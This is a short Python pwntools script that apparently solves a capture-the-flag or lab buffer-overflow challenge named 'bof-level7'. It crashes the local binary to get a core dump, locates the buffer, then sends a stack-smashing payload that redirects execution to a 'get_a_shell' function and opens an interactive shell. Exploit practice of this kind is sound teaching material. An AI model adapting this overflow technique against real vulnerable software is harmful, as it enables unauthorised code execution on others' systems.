#!/usr/bin/env python
import os
from pwn import *

#define our process
p = process("./bof-level7")

e = ELF('bof-level7')
shellHex = e.symbols['get_a_shell']
print("Shell: ")
print(hex(shellHex))
print(shellHex)

buff = "A" * 0x80 + "\x00"

# generate core
if not os.path.exists('core'):
    p.sendline(buff)
    p.wait()

c = Core("./core")

buffer_address = c.stack.find(buff)
print("Buffer: ")
print(hex(buffer_address))
print(buffer_address)

#buff = "A" * 0x80 + "\x00"
buff = "A" * 0x5c + "BBBB" + p32(134513915) + "CCCC" * 5 + "\x00"

print("Buff: " + buff)
print(p.recv())
p.sendline(buff)

#gdb.attach(p)

p.interactive()
